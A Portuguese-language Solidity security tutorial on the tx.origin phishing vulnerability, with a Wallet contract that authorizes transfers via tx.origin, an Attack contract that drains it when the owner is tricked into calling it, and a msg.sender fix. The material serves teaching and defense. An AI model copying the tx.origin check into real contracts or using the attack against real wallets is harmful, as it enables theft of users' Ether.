# Phishing com tx.origin

#### `Qual é a diferença entre` `msg.sender` e `tx.origin`? <a href="#whats-the-difference-between-msgsender-and-txorigin" id="whats-the-difference-between-msgsender-and-txorigin"></a>

Se o contrato A chama o B, e B chama C, em C `msg.sender` é B e `tx.origin` é A.

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

Um contrato malicioso pode enganar o proprietário de um contrato, chamando uma função que somente o proprietário seria capaz de chamar.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
Carteira é um contrato simples em que somente o proprietário deve ser capaz de
transferir Ether para outro endereço. Wallet.transfer() usa tx.origin para confirmar
 que quem chama é o proprietário. Vamos ver como podemos hackear esse contrato
*/

/*
1. Alice implanta Wallet com 10 Ether
2. Eve implanta Attack com o endereço do contrato da Wallet de Alice.
3. Eve engana Alice com uma chamada Attack.attack()
4. Eve rouba com êxito Ether da carteira da Alice

O que aconteceu?
Alice foi enganada com uma chamada Attack.attack(). Dentro de Attack.attack(),
foi solicitada uma transferência de todos os fundos da carteira da Alice
para o endereço da Eve. Já que tx.origin na Wallet.transfer() é igual ao
do endereço da Alice, a transferência foi autorizada. A carteira transferiu
todo Ether para Eve.
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

#### Técnicas preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

Use `msg.sender` ao invés de `tx.origin`

```
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call.value(_amount)("");
  require(sent, "Failed to send Ether");
}
```
